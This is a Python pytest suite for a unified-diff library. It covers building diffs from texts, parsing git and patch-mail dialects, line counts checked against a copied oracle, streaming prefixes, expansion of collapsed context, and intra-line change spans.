"""
`imscribe.diff`: the two constructors, the model they share, and its properties.

The property tests draw their inputs from a seeded `random.Random`, so a
failure names a seed and reruns the same way.
"""

from __future__ import annotations

import difflib
import random

import pytest

from imscribe.diff import (
    COMBINED,
    NO_NEWLINE,
    NOT_A_DIFF,
    ContextUnavailable,
    Diff,
    DiffApplyError,
    DiffRow,
    FileStatus,
    Hunk,
    RowKind,
    SidePair,
    UnifiedDiffStream,
    tokenize,
)
from imscribe.diff import _compare as compare_lines

A, R, C, M = RowKind.ADD, RowKind.REMOVE, RowKind.CONTEXT, RowKind.META


# ---------------------------------------------------------------------------
# pptmstr's counting rule, copied as an oracle
# ---------------------------------------------------------------------------
#
# `../pptmstr/pptmstr/model.py`, `count_diff_lines` and `_hunk_budget`, read
# 2026-10-07 and copied without change to their logic. The suite must not
# import a sibling checkout, and the point is to agree with that rule.


def _hunk_budget(line: str) -> tuple[int, int] | None:
    if not line.startswith("@@"):
        return None
    body = line[2:].partition("@@")[0].split()
    if len(body) != 2 or not body[0].startswith("-") or not body[1].startswith("+"):
        return None
    lengths = []
    for part in body:
        _, sep, length = part[1:].partition(",")
        if sep and not length.isdigit():
            return None
        lengths.append(int(length) if sep else 1)
    return lengths[0], lengths[1]


def pptmstr_count_diff_lines(diff: str | None) -> tuple[int, int]:
    if not diff:
        return 0, 0
    added = 0
    removed = 0
    old_left = 0
    new_left = 0
    for line in diff.splitlines():
        hunk = _hunk_budget(line)
        if hunk is not None:
            old_left, new_left = hunk
            continue
        if old_left <= 0 and new_left <= 0:
            continue
        if line.startswith("+"):
            added += 1
            new_left -= 1
        elif line.startswith("-"):
            removed += 1
            old_left -= 1
        elif line.startswith("\\"):
            continue
        else:
            old_left -= 1
            new_left -= 1
    return added, removed


def pptmstr_unified(before: str | None, after: str, label: str) -> str:
    """`../pptmstr/pptmstr/approval.py` `_unified`, likewise copied."""
    prefix_a, prefix_b = ("", "") if label.startswith("/") else ("a/", "b/")
    lines = difflib.unified_diff(
        (before or "").splitlines(keepends=True),
        after.splitlines(keepends=True),
        fromfile=f"{prefix_a}{label}" if before is not None else "/dev/null",
        tofile=f"{prefix_b}{label}",
        n=3,
    )
    return "".join(lines)


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def kinds(hunk: Hunk) -> str:
    return "".join(r.kind.value for r in hunk.rows)


def flat(diff: Diff, drop_provisional: bool = True) -> list[tuple[int, int, DiffRow]]:
    """Every row; less the `Diff.unsettled` last ones, which may still change."""
    rows = list(diff.rows())
    if drop_provisional and diff.unsettled:
        del rows[-diff.unsettled :]
    return rows


_WORDS = ["alpha", "beta", "x = 1", "", "    return x", "---", "+++ b", "-- sql", "@@", "}", "\tq"]


def random_text(rng: random.Random, lines: int) -> str:
    body = [
        rng.choice(_WORDS) + (f" {rng.randrange(4)}" if rng.random() < 0.5 else "")
        for _ in range(lines)
    ]
    text = "\n".join(body)
    if lines and rng.random() < 0.7:
        text += "\n"
    return text


def mutate(rng: random.Random, text: str) -> str:
    lines = text.split("\n")
    for _ in range(rng.randrange(1, 5)):
        at = rng.randrange(len(lines) + 1)
        roll = rng.random()
        if roll < 0.35:
            lines.insert(at, rng.choice(_WORDS))
        elif roll < 0.7 and lines:
            del lines[min(at, len(lines) - 1)]
        elif lines:
            lines[min(at, len(lines) - 1)] += " changed"
    return "\n".join(lines)


def text_pairs(count: int = 150) -> list[tuple[str | None, str | None]]:
    rng = random.Random(20261007)
    pairs: list[tuple[str | None, str | None]] = [
        (None, "a\nb\n"),
        ("a\nb\n", None),
        ("", "a"),
        ("a", ""),
        ("a\n", "a"),
        ("a", "a\n"),
        ("a\r\nb\r\n", "a\r\nc\r\n"),
        ("a\r\nb\r", "a\nb\r"),
        ("x\n" * 40, "x\n" * 41),
        (None, ""),
    ]
    for _ in range(count):
        before = random_text(rng, rng.randrange(0, 40))
        pairs.append((before, mutate(rng, before)))
    return pairs


# ---------------------------------------------------------------------------
# before / after
# ---------------------------------------------------------------------------


def test_a_one_line_change_is_one_hunk_with_numbers_and_markerless_text() -> None:
    before = "".join(f"line {i}\n" for i in range(1, 11))
    after = before.replace("line 5\n", "line five\n")
    diff = Diff.from_texts(before, after, "notes.txt")
    (file,) = diff.files
    (hunk,) = file.hunks
    assert file.label == "notes.txt"
    assert (file.old_path, file.new_path) == ("a/notes.txt", "b/notes.txt")
    assert file.status is FileStatus.MODIFIED
    assert hunk.header == "@@ -2,7 +2,7 @@"
    assert kinds(hunk) == "   -+   "
    assert [(r.old_no, r.new_no, r.text) for r in hunk.rows[2:5]] == [
        (4, 4, "line 4"),
        (5, None, "line 5"),
        (None, 5, "line five"),
    ]
    assert (diff.added, diff.removed) == (1, 1) == (file.added, file.removed)


def test_an_absolute_label_gets_no_a_b_prefix() -> None:
    (file,) = Diff.from_texts("a\n", "b\n", "/tmp/x.py").files
    assert (file.old_path, file.new_path, file.label) == ("/tmp/x.py", "/tmp/x.py", "/tmp/x.py")


@pytest.mark.parametrize(
    ("before", "after", "status", "counts"),
    [
        (None, "a\nb\n", FileStatus.NEW, (2, 0)),
        ("a\nb\n", None, FileStatus.DELETED, (0, 2)),
        ("a\n", "a\n", FileStatus.UNCHANGED, (0, 0)),
        (None, "", FileStatus.NEW, (0, 0)),
        ("a\0b", "c", FileStatus.MODIFIED, (1, 1)),
    ],
)
def test_file_states(
    before: str | None, after: str | None, status: FileStatus, counts: tuple[int, int]
) -> None:
    diff = Diff.from_texts(before, after, "f")
    (file,) = diff.files
    assert file.status is status
    assert (diff.added, diff.removed) == counts
    if status is FileStatus.UNCHANGED:
        assert file.hunks == ()
    if status is FileStatus.NEW:
        assert file.old_path == "/dev/null"
    if status is FileStatus.DELETED:
        assert file.new_path == "/dev/null"


def test_will_not_apply_is_the_hosts_label_and_is_carried() -> None:
    diff = Diff.from_texts("old", "new", "x.py", will_not_apply="anchor not found in file")
    assert diff.files[0].will_not_apply == "anchor not found in file"
    parsed = Diff.from_unified(diff.to_unified())
    assert parsed.files[0].will_not_apply == ""
    marked = parsed.mark_will_not_apply("stale")
    assert marked.files[0].will_not_apply == "stale"
    assert marked.files[0].hunks == parsed.files[0].hunks
    assert parsed.files[0].will_not_apply == ""  # the original is untouched


def test_no_newline_at_end_of_file_is_a_meta_row_after_the_line() -> None:
    (file,) = Diff.from_texts("a\nb", "a\nc", "f").files
    (hunk,) = file.hunks
    assert kinds(hunk) == " -\\+\\"
    assert hunk.rows[2] == DiffRow(M, NO_NEWLINE)
    assert [hunk.terminator(i) for i in range(5)] == ["\n", "", "", "", ""]
    assert (file.added, file.removed) == (1, 1)
    assert hunk.header == "@@ -1,2 +1,2 @@"


def test_crlf_is_the_rows_eol_and_not_its_text() -> None:
    (file,) = Diff.from_texts("a\r\nb\r\n", "a\r\nc\r\n", "f").files
    (hunk,) = file.hunks
    assert [(r.text, r.eol) for r in hunk.rows] == [("a", "\r\n"), ("b", "\r\n"), ("c", "\r\n")]
    # A carriage return and no newline: the terminator is what is left.
    (hunk,) = Diff.from_texts("b\r", "c\r", "f").files[0].hunks
    assert [(r.text, hunk.terminator(i)) for i, r in enumerate(hunk.rows) if r.kind is not M] == [
        ("b", "\r"),
        ("c", "\r"),
    ]


@pytest.mark.parametrize("index", range(len(text_pairs())))
def test_apply_gives_after_and_unified_text_round_trips(index: int) -> None:
    before, after = text_pairs()[index]
    for context in (3, 0, 1):
        diff = Diff.from_texts(before, after, "f.txt", context=context)
        (file,) = diff.files
        if file.status is FileStatus.BINARY:
            continue
        assert file.apply(before) == after or (after is None and file.apply(before) is None)
        text = diff.to_unified()
        parsed = Diff.from_unified(text)
        assert [h.rows for h in parsed.files[0].hunks] == [h.rows for h in file.hunks]
        assert [h.header for h in parsed.files[0].hunks] == [h.header for h in file.hunks]
        assert parsed.to_unified() == text
        # ... and a diff read from text applies just as the one it came from.
        if file.hunks:
            assert parsed.files[0].apply(before) == file.apply(before)
        assert (diff.added, diff.removed) == pptmstr_count_diff_lines(text)
        assert (parsed.added, parsed.removed) == (diff.added, diff.removed)


def test_apply_refuses_a_text_the_diff_does_not_describe() -> None:
    (file,) = Diff.from_texts("a\nb\nc\n", "a\nB\nc\n", "f").files
    with pytest.raises(DiffApplyError):
        file.apply("a\nx\nc\n")
    with pytest.raises(DiffApplyError):
        Diff.from_unified("-a\n+b\n").files[0].apply("a\n")  # no ranges: nowhere to put it
    with pytest.raises(DiffApplyError):
        Diff.from_texts("a\0", "b", "f", binary=True).files[0].apply("a\0")


def test_one_edit_in_a_long_file_does_not_cost_the_file() -> None:
    """
    The common ends are set aside before `difflib` runs, so what is matched is
    the edit. Counted, not timed: the matcher is given two one-line lists.
    """
    import imscribe.diff as module

    seen: list[tuple[int, int]] = []
    real = module.SequenceMatcher

    class Spy(real):  # type: ignore[type-arg, misc, valid-type]
        def __init__(self, junk: object, a: list[str], b: list[str], **kw: object) -> None:
            seen.append((len(a), len(b)))
            super().__init__(junk, a, b, **kw)

    before = "".join(f"line {i}\n" for i in range(5000))
    after = before.replace("line 2500\n", "line twenty-five hundred\n")
    module.SequenceMatcher = Spy  # type: ignore[misc]
    try:
        diff = Diff.from_texts(before, after, "big")
    finally:
        module.SequenceMatcher = real  # type: ignore[misc]
    assert seen == [(1, 1)]
    assert (diff.added, diff.removed) == (1, 1)
    assert diff.files[0].hunks[0].header == "@@ -2498,7 +2498,7 @@"


# ---------------------------------------------------------------------------
# counts
# ---------------------------------------------------------------------------


def test_content_that_looks_like_a_header_is_counted_as_content() -> None:
    """
    pptmstr's case: removing a markdown rule gives the physical line `----`,
    removing `-- x` gives `--- x`, adding `++ y` gives `+++ y`.
    """
    before = "title\n---\n-- x\nkeep\n"
    after = "title\n++ y\nkeep\n"
    text = pptmstr_unified(before, after, "doc.md")
    assert "\n----\n" in text and "\n--- x\n" in text and "\n+++ y\n" in text
    diff = Diff.from_unified(text)
    (file,) = diff.files
    assert (diff.added, diff.removed) == pptmstr_count_diff_lines(text) == (1, 2)
    assert [(r.kind, r.text) for r in file.hunks[0].rows] == [
        (C, "title"),
        (R, "---"),
        (R, "-- x"),
        (A, "++ y"),
        (C, "keep"),
    ]
    assert file.apply(before) == after
    built = Diff.from_texts(before, after, "doc.md")
    assert (built.added, built.removed) == (1, 2)


@pytest.mark.parametrize("seed", range(60))
def test_counts_agree_with_pptmstr_on_what_pptmstr_produces(seed: int) -> None:
    rng = random.Random(seed)
    before = random_text(rng, rng.randrange(0, 30))
    after = mutate(rng, before)
    text = pptmstr_unified(before if seed % 5 else None, after, "f")
    diff = Diff.from_unified(text)
    assert (diff.added, diff.removed) == pptmstr_count_diff_lines(text)


def test_totals_sum_over_files() -> None:
    one = Diff.from_texts("a\n", "b\nc\n", "one")
    two = Diff.from_texts("a\nb\n", None, "two")
    both = Diff(one.files + two.files)
    assert (both.added, both.removed) == (2, 3)
    assert [(f.added, f.removed) for f in both.files] == [(2, 1), (0, 2)]
    parsed = Diff.from_unified(both.to_unified())
    assert [f.label for f in parsed.files] == ["one", "two"]
    assert [f.status for f in parsed.files] == [FileStatus.MODIFIED, FileStatus.DELETED]
    assert (parsed.added, parsed.removed) == (2, 3)


# ---------------------------------------------------------------------------
# unified text: dialects
# ---------------------------------------------------------------------------

GIT = """\
commit 1234
Author: someone

    - a message line that begins with a dash

diff --git a/src/app.py b/src/app.py
index 83db48f..bf2a1c3 100644
--- a/src/app.py
+++ b/src/app.py
@@ -1,3 +1,4 @@ def main():
 one
-two
+TWO
+two and a half
 three
@@ -10 +11 @@
-ten
+TEN
diff --git a/new.txt b/new.txt
new file mode 100644
index 0000000..e69de29
--- /dev/null
+++ b/new.txt
@@ -0,0 +1,2 @@
+hello
+world
diff --git a/gone.txt b/gone.txt
deleted file mode 100644
--- a/gone.txt
+++ /dev/null
@@ -1 +0,0 @@
-bye
\\ No newline at end of file
diff --git a/logo.png b/logo.png
index 1111111..2222222 100644
Binary files a/logo.png and b/logo.png differ
diff --git a/mode.sh b/mode.sh
old mode 100644
new mode 100755
"""


def test_git_output_with_several_files() -> None:
    diff = Diff.from_unified(GIT)
    assert [f.label for f in diff.files] == [
        "src/app.py",
        "new.txt",
        "gone.txt",
        "logo.png",
        "mode.sh",
    ]
    assert [f.status for f in diff.files] == [
        FileStatus.MODIFIED,
        FileStatus.NEW,
        FileStatus.DELETED,
        FileStatus.BINARY,
        FileStatus.MODIFIED,
    ]
    app, new, gone, logo, mode = diff.files
    assert [h.header for h in app.hunks] == ["@@ -1,3 +1,4 @@ def main():", "@@ -10 +11 @@"]
    assert app.hunks[0].section == "def main():"
    assert [(r.old_no, r.new_no) for r in app.hunks[0].rows] == [
        (1, 1),
        (2, None),
        (None, 2),
        (None, 3),
        (3, 4),
    ]
    assert [(r.old_no, r.new_no) for r in app.hunks[1].rows] == [(10, None), (None, 11)]
    assert new.hunks[0].header == "@@ -0,0 +1,2 @@"
    assert (new.hunks[0].old_start, new.hunks[0].new_start) == (1, 1)
    assert kinds(gone.hunks[0]) == "-\\"
    assert gone.hunks[0].terminator(0) == ""
    assert logo.hunks == () and mode.hunks == ()
    assert "index 83db48f..bf2a1c3 100644" in app.header
    assert (diff.added, diff.removed) == (5, 3) == pptmstr_count_diff_lines(GIT)
    assert all(h.complete for f in diff.files for h in f.hunks)
    assert new.apply(None) == "hello\nworld\n"
    assert gone.apply("bye") is None


def test_a_timestamp_after_a_tab_is_not_part_of_the_path() -> None:
    text = (
        "--- old/x.c\t2026-10-07 10:00:00\n+++ new/x.c\t2026-10-07 10:00:01\n@@ -1 +1 @@\n-a\n+b\n"
    )
    (file,) = Diff.from_unified(text).files
    assert (file.old_path, file.new_path, file.label) == ("old/x.c", "new/x.c", "new/x.c")


def test_tabs_in_content_are_kept() -> None:
    (file,) = Diff.from_unified("@@ -1 +1 @@\n-\tif x:\n+\tif y:\t# why\n").files
    assert [r.text for r in file.hunks[0].rows] == ["\tif x:", "\tif y:\t# why"]


def test_a_crlf_patch_reads_as_the_same_rows_with_crlf_eols() -> None:
    lf = Diff.from_unified(GIT)
    crlf = Diff.from_unified(GIT.replace("\n", "\r\n"))
    assert [f.label for f in crlf.files] == [f.label for f in lf.files]
    assert [f.status for f in crlf.files] == [f.status for f in lf.files]
    assert [(f, h, r.kind, r.text, r.old_no, r.new_no) for f, h, r in crlf.rows()] == [
        (f, h, r.kind, r.text, r.old_no, r.new_no) for f, h, r in lf.rows()
    ]
    assert {r.eol for _, _, r in crlf.rows() if r.kind is not M} == {"\r\n"}


def test_multiedit_fragments_as_pptmstr_joins_them() -> None:
    """`approval.render_diff`: one `_unified` per edit, joined with a newline."""
    parts = [
        pptmstr_unified("alpha\n", "beta\n", "edit 1"),
        pptmstr_unified("one\ntwo\n", "one\n2\n", "edit 2"),
    ]
    text = "\n".join(parts)
    diff = Diff.from_unified(text)
    assert [f.label for f in diff.files] == ["edit 1", "edit 2"]
    assert [kinds(f.hunks[0]) for f in diff.files] == ["-+", " -+"]
    assert (diff.added, diff.removed) == pptmstr_count_diff_lines(text) == (2, 2)


def test_headerless_fragments_are_hunks_of_one_unnamed_file() -> None:
    text = "@@ -1 +1 @@\n-a\n+b\n@@ -9,2 +9 @@\n keep\n-drop\n"
    (file,) = Diff.from_unified(text).files
    assert file.label == "" and (file.old_path, file.new_path) == ("", "")
    assert [kinds(h) for h in file.hunks] == ["-+", " -"]
    assert Diff.from_unified(text).to_unified() == text


def test_a_fragment_with_no_hunk_header_at_all_has_rows_and_no_numbers() -> None:
    """What a model types into a fenced block."""
    (file,) = Diff.from_unified(" def f():\n-    return 1\n+    return 2\n\n rest\n").files
    (hunk,) = file.hunks
    assert kinds(hunk) == " -+  "
    assert hunk.rows[3].text == ""  # the blank line is a blank context line
    assert all(r.old_no is None and r.new_no is None for r in hunk.rows)
    assert (hunk.old_start, hunk.new_start) == (None, None)
    assert hunk.header == "@@"
    assert (file.added, file.removed) == (1, 1)


def test_file_headers_followed_directly_by_content() -> None:
    (file,) = Diff.from_unified("--- a/x\n+++ b/x\n-old\n+new\n").files
    assert file.label == "x" and kinds(file.hunks[0]) == "-+"


@pytest.mark.parametrize("header", ["@@", "@@ ... @@", "@@ def f(): @@"])
def test_a_hunk_header_with_no_ranges(header: str) -> None:
    text = f"--- a/x\n+++ b/x\n{header}\n ctx\n-a\n+++ b\nunmarked\n{header}\n+z\n"
    (file,) = Diff.from_unified(text).files
    assert [kinds(h) for h in file.hunks] == [" -+ ", "+"]
    # With a hunk open, `+++ b` is the addition of `++ b`.
    assert file.hunks[0].rows[2] == DiffRow(A, "++ b")
    assert file.hunks[0].rows[3] == DiffRow(C, "unmarked")
    assert file.hunks[0].old_start is None


def test_a_hunk_that_runs_past_its_declared_lengths_keeps_its_lines() -> None:
    text = "--- a/x\n+++ b/x\n@@ -1,1 +1,1 @@\n-a\n+b\n+c\n d\n\n+ignored after the blank\n"
    (file,) = Diff.from_unified(text).files
    (hunk,) = file.hunks
    assert kinds(hunk) == "-++ "
    assert hunk.header == "@@ -1,2 +1,3 @@"  # counted from the rows, not copied
    assert [(r.old_no, r.new_no) for r in hunk.rows] == [(1, None), (None, 1), (None, 2), (2, 3)]


def test_a_hunk_cut_short_is_incomplete() -> None:
    (file,) = Diff.from_unified("@@ -1,3 +1,3 @@\n a\n-b\n").files
    assert not file.hunks[0].complete
    # pptmstr's joined last line (see the module docstring's known limits).
    text = pptmstr_unified("a\nb", "a\nc", "f")
    assert text.endswith("-b+c")
    diff = Diff.from_unified(text)
    assert kinds(diff.files[0].hunks[0]) == " -"
    assert not diff.files[0].hunks[0].complete
    assert (diff.added, diff.removed) == pptmstr_count_diff_lines(text) == (0, 1)


def test_blank_text_has_no_files() -> None:
    assert Diff.from_unified("").files == ()
    assert Diff.from_unified("\n\n").files == ()


def test_dash_dash_dash_in_a_hunk_is_the_removal_of_dash_dash_unless_a_header_follows() -> None:
    """
    Was a pinned known limit (`--- x` in a hunk with no lengths opened a new
    file). Review 1 decided it: one line of lookahead, so the removal of the
    SQL comment `-- x` is a removal wherever it is.
    """
    for text in ("@@\n-a\n--- x\n+b\n", "@@ -1,2 +1 @@\n-a\n--- x\n+b\n"):
        diff = Diff.from_unified(text)
        assert [f.old_path for f in diff.files] == [""]
        assert [(r.kind, r.text) for _, _, r in diff.rows()] == [(R, "a"), (R, "-- x"), (A, "b")]


# ---------------------------------------------------------------------------
# streaming
# ---------------------------------------------------------------------------

MAIL_NAME = "1" + "2" * 39
MAIL = (
    f"From {MAIL_NAME} Mon Sep 17 00:00:00 2001\nSubject: [PATCH] x\n\n"
    "- a bullet in the message\n---\n"
    " f.py | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a/f.py b/f.py\n"
    "index 1..2 100644\n--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n-a\n+b\n-- \n2.39.0\n"
)

STREAMS = [
    GIT,
    GIT.replace("\n", "\r\n"),
    "--- a/x\n+++ b/x\n@@\n ctx\n-a\n+++ b\nunmarked\n@@ ... @@\n+z\n",
    " def f():\n-    return 1\n+    return 2\n\n rest\n",
    "--- a/x\n+++ b/x\n@@ -1,1 +1,1 @@\n-a\n+b\n+c\n d\n\n+ignored\n"
    "--- a/y\n+++ b/y\n@@ -1 +1 @@\n-q\n+r\n",
    "\n".join(
        [
            pptmstr_unified("alpha\n", "beta\n", "edit 1"),
            pptmstr_unified("one\ntwo", "one\n2", "edit 2"),
            pptmstr_unified("title\n---\n-- x\nkeep\n", "title\n++ y\nkeep\n", "edit 3"),
        ]
    ),
    Diff.from_texts("a\nb", "a\nc", "f").to_unified(),
    # Review 1: pptmstr's MultiEdit string with no closing newlines (item 2),
    # an over-declared hunk before the next file (item 3), a `---` removal in
    # and out of a budget, a format-patch mail (item 8), a fence whose first
    # line is unmarked (item 10).
    "\n".join([pptmstr_unified("foo", "bar", "edit 1"), pptmstr_unified("x", "y", "edit 2")]),
    "--- a/x\n+++ b/x\n@@ -1,3 +1,3 @@\n-a\n+b\n--- a/y\n+++ b/y\n@@ -1 +1 @@\n-q\n+r\n",
    "@@ -1,4 +1,2 @@\n-a\n---\n--- x\n+++ y\n k\n@@\n-b\n---\n--- z\n+c\n",
    MAIL,
    "def f():\n\n-    return 1\n+    return 2\n",
]


@pytest.mark.parametrize("index", range(len(STREAMS)))
def test_every_prefix_yields_a_prefix_of_the_rows(index: int) -> None:
    """
    The streaming invariant, by exhaustion over every character prefix: the
    rows of a prefix, less a provisional last one, are a prefix of the rows of
    the whole -- same file index, same hunk index, equal row.
    """
    text = STREAMS[index]
    whole = flat(Diff.from_unified(text))
    assert whole  # not vacuous
    stream = UnifiedDiffStream()
    longest = 0
    for end in range(1, len(text) + 1):
        stream.feed(text[end - 1])
        got = flat(stream.diff)
        assert got == whole[: len(got)], f"prefix of {end} characters"
        scratch = UnifiedDiffStream()
        scratch.feed(text[:end])
        assert stream.diff == scratch.diff  # incremental == from scratch
        assert 0 <= stream.diff.unsettled <= 3
        assert stream.diff.unsettled >= stream.diff.provisional
        if text[end - 1] == "\n":
            assert not stream.diff.provisional
        longest = max(longest, len(got))
    assert stream.text == text
    stream.close()  # the text is complete: nothing is left unsettled
    assert stream.diff == Diff.from_unified(text) and stream.diff.unsettled == 0
    assert flat(stream.diff) == whole and longest >= len(whole) - 1


def test_an_incomplete_last_line_is_a_provisional_row_that_grows() -> None:
    stream = UnifiedDiffStream()
    stream.feed("@@ -1 +1,2 @@\n-a\n+he")
    assert stream.diff.provisional
    assert flat(stream.diff, drop_provisional=False)[-1][2] == DiffRow(A, "he", None, 1)
    assert not stream.diff.files[0].hunks[0].complete
    stream.feed("llo")
    assert flat(stream.diff, drop_provisional=False)[-1][2] == DiffRow(A, "hello", None, 1)
    stream.feed("\n")
    assert not stream.diff.provisional
    assert flat(stream.diff)[-1][2] == DiffRow(A, "hello", None, 1)
    # An unfinished header is not a row.
    stream.feed("+x\n@@ -9")
    assert not stream.diff.provisional
    assert len(stream.diff.files[0].hunks) == 1
    assert stream.diff.files[0].hunks[0].complete


def test_settled_hunks_and_files_are_the_same_objects_in_the_next_snapshot() -> None:
    """What "cheap" means here, and what a view can key a cache on."""
    stream = UnifiedDiffStream()
    stream.feed(GIT[: GIT.index("@@ -10 +11 @@")])
    first = stream.diff
    assert stream.diff is first  # no new text, no new snapshot
    stream.feed("@@ -10 +11 @@\n-ten\n")
    second = stream.diff
    assert second is not first
    assert second.files[0].hunks[0] is not first.files[0].hunks[0]  # it was the open one
    stream.feed("+TEN\ndiff --git a/new.txt b/new.txt\n")
    third = stream.diff
    assert third.files[0].hunks[0] is second.files[0].hunks[0]
    stream.feed("--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1,2 @@\n+hello\n")
    fourth = stream.diff
    assert fourth.files[0] is third.files[0]
    assert fourth.files[0].hunks[1] is third.files[0].hunks[1]


def test_set_text_feeds_the_suffix_and_starts_over_when_the_text_is_not_an_extension() -> None:
    stream = UnifiedDiffStream()
    stream.set_text("@@ -1 +1 @@\n-a\n")
    settled = stream.diff
    stream.set_text("@@ -1 +1 @@\n-a\n+b\n")
    assert stream.diff == Diff.from_unified("@@ -1 +1 @@\n-a\n+b\n")
    assert flat(stream.diff)[0] == flat(settled)[0]
    stream.set_text("@@ -1 +1 @@\n-z\n")
    assert [r.text for _, _, r in stream.diff.rows()] == ["z"]
    assert stream.text == "@@ -1 +1 @@\n-z\n"


# ---------------------------------------------------------------------------
# collapsed context
# ---------------------------------------------------------------------------


def _numbered(count: int) -> str:
    return "".join(f"line {i}\n" for i in range(1, count + 1))


def test_gaps_between_hunks_are_reported_with_their_sizes() -> None:
    before = _numbered(100)
    after = before.replace("line 20\n", "twenty\n").replace("line 60\n", "sixty\n")
    (file,) = Diff.from_texts(before, after, "f").files
    assert [h.header for h in file.hunks] == ["@@ -17,7 +17,7 @@", "@@ -57,7 +57,7 @@"]
    assert file.expandable
    assert [(g.index, g.old_start, g.new_start, g.count, g.expandable) for g in file.gaps] == [
        (0, 1, 1, 16, True),
        (1, 24, 24, 33, True),
        (2, 64, 64, 37, True),
    ]


def test_expanding_in_steps_from_either_edge_and_merging_when_a_gap_is_used_up() -> None:
    before = _numbered(100)
    after = before.replace("line 20\n", "twenty\n").replace("line 60\n", "sixty\n")
    diff = Diff.from_texts(before, after, "f")
    (file,) = diff.files

    top = file.expand(1, 10)  # the first ten lines of the gap, under hunk 0
    assert top.hunks[0].header == "@@ -17,17 +17,17 @@"
    assert [r.text for r in top.hunks[0].rows[-10:]] == [f"line {i}" for i in range(24, 34)]
    assert [(r.old_no, r.new_no) for r in top.hunks[0].rows[-2:]] == [(32, 32), (33, 33)]
    assert top.gaps[1].count == 23 and top.hunks[1] is file.hunks[1]

    bottom = file.expand(1, 10, edge="bottom")  # the last ten, over hunk 1
    assert bottom.hunks[1].header == "@@ -47,17 +47,17 @@"
    assert bottom.hunks[1].rows[0] == DiffRow(C, "line 47", 47, 47)
    assert bottom.gaps[1].count == 23

    merged = top.expand(1, None)
    assert len(merged.hunks) == 1 and merged.hunks[0].header == "@@ -17,47 +17,47 @@"
    assert [g.count for g in merged.gaps] == [16, 37]

    first = file.expand(0, 5)  # one neighbour: attaches to hunk 0 whatever the edge
    assert first.hunks[0].header == "@@ -12,12 +12,12 @@" and first.gaps[0].count == 11
    last = file.expand(2, 1000)
    assert last.hunks[1].header == "@@ -57,44 +57,44 @@"
    assert (last.gaps[2].count, last.gaps[2].expandable) == (0, False)
    assert last.expand(2) is last  # nothing left: the same object back

    # However it is expanded it is still the same change.
    for grown in (top, bottom, merged, first, last):
        assert grown.apply(before) == after
        assert (grown.added, grown.removed) == (2, 2)
        assert Diff.from_unified(grown.to_unified()).files[0].hunks == grown.hunks

    everything = diff
    while any(g.expandable for g in everything.files[0].gaps):
        gap = next(g for g in everything.files[0].gaps if g.expandable)
        everything = everything.expand(0, gap.index, 7, "bottom" if gap.index % 2 else "top")
    (whole,) = everything.files[0].hunks
    assert whole.header == "@@ -1,100 +1,100 @@" and len(whole.rows) == 102
    assert diff.files[0].hunks == file.hunks  # the original is untouched


def test_expanding_to_the_end_of_a_file_with_no_closing_newline_adds_the_marker() -> None:
    before = _numbered(20) + "last"
    after = before.replace("line 5\n", "five\n")
    (file,) = Diff.from_texts(before, after, "f").files
    grown = file.expand(1, None)
    assert kinds(grown.hunks[0]).endswith(" \\")
    assert grown.apply(before) == after


def test_a_diff_read_from_unified_text_reports_context_as_not_available() -> None:
    before = _numbered(100)
    after = before.replace("line 20\n", "twenty\n").replace("line 60\n", "sixty\n")
    (file,) = Diff.from_unified(Diff.from_texts(before, after, "f").to_unified()).files
    assert not file.expandable
    # What the text does state is still reported: the sizes of the gaps it brackets.
    assert [(g.count, g.expandable) for g in file.gaps] == [
        (16, False),
        (33, False),
        (None, False),
    ]
    with pytest.raises(ContextUnavailable):
        file.expand(1)
    with pytest.raises(ContextUnavailable):
        Diff((file,)).expand(0, 1)
    bare = Diff.from_unified("-a\n+b\n").files[0]
    assert [(g.count, g.expandable) for g in bare.gaps] == [(None, False), (None, False)]
    assert Diff.from_texts("a\n", "a\n", "f").files[0].gaps == ()


# ---------------------------------------------------------------------------
# intra-line spans and side-by-side pairing
# ---------------------------------------------------------------------------


def test_tokens_are_words_whitespace_runs_and_single_marks() -> None:
    text = "foo_bar(x1,  42)->y"
    assert [text[s:e] for s, e in tokenize(text)] == [
        "foo_bar",
        "(",
        "x1",
        ",",
        "  ",
        "42",
        ")",
        "-",
        ">",
        "y",
    ]
    assert tokenize("") == []


def test_spans_cover_the_changed_tokens_of_a_paired_line() -> None:
    old, new = "    total = price * count", "    total = price * quantity + tax"
    (hunk,) = Diff.from_texts(f"a\n{old}\nb\n", f"a\n{new}\nb\n", "f").files[0].hunks
    assert kinds(hunk) == " -+ "
    assert [old[s:e] for s, e in hunk.spans[1]] == ["count"]
    assert [new[s:e] for s, e in hunk.spans[2]] == ["quantity + tax"]
    assert hunk.spans[0] == () and hunk.spans[3] == ()
    assert len(hunk.spans) == len(hunk.rows)


def test_a_whitespace_only_change_is_a_span_over_the_whitespace() -> None:
    (hunk,) = Diff.from_texts("  x = 1\n", "      x = 1\n", "f").files[0].hunks
    assert hunk.spans == (((0, 2),), ((0, 6),))


def test_unrelated_lines_carry_no_spans_whatever_punctuation_they_share() -> None:
    """Similarity is counted in characters of non-whitespace tokens."""
    similarity, a, b = compare_lines("    foo(alpha, beta)", "    bar(gamma, delta)")
    assert similarity < 0.5
    (hunk,) = (
        Diff.from_texts("    foo(alpha, beta)\n", "    bar(gamma, delta)\n", "f").files[0].hunks
    )
    assert hunk.spans == ((), ())
    assert hunk.side_by_side == (SidePair(0, 1),)  # still beside each other


def test_side_by_side_puts_a_remove_run_beside_its_add_run_with_blanks() -> None:
    text = "@@ -1,6 +1,5 @@\n ctx\n-apple\n-banana\n-cherry\n+dog\n ctx2\n-egg\n+fig\n+goat\n"
    (hunk,) = Diff.from_unified(text).files[0].hunks
    assert hunk.side_by_side == (
        SidePair(0, 0),
        SidePair(1, 4),
        SidePair(2, None),
        SidePair(3, None),
        SidePair(5, 5),
        SidePair(6, 7),
        SidePair(None, 8),
    )


def test_an_inserted_line_does_not_shear_the_pairs_below_it() -> None:
    """The alignment is by similarity, in order, not by position."""
    before = "def area(w, h):\n    return w * h\n"
    after = "# rectangles only\ndef area(width, h):\n    return width * h\n"
    (hunk,) = Diff.from_texts(before, after, "f").files[0].hunks
    assert kinds(hunk) == "--+++"
    assert hunk.side_by_side == (SidePair(None, 2), SidePair(0, 3), SidePair(1, 4))
    assert [hunk.rows[0].text[s:e] for s, e in hunk.spans[0]] == ["w"]
    assert [hunk.rows[3].text[s:e] for s, e in hunk.spans[3]] == ["width"]
    assert hunk.spans[2] == ()


